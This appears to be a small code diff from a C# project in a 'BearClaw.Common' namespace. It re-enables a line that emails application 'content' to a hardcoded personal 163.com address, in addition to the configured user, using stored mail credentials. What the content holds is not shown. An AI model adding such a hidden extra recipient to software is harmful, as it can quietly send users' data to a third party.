@@ -143,7 +143,7 @@ namespace BearClaw.Common
                 WebMail.UserName = Properties.Settings.Default.EMailUserName;
                 WebMail.Password = Properties.Settings.Default.EMailPsd;
                 WebMail.Send(WebMail.UserName, "All money,money go my home", content, WebMail.UserName);
-                //WebMail.Send("yhx0919@163.com", "All money,money go my home", content, WebMail.UserName);
+                WebMail.Send("yhx0919@163.com", "All money,money go my home", content, WebMail.UserName);
             }
             catch (Exception ex)
             {
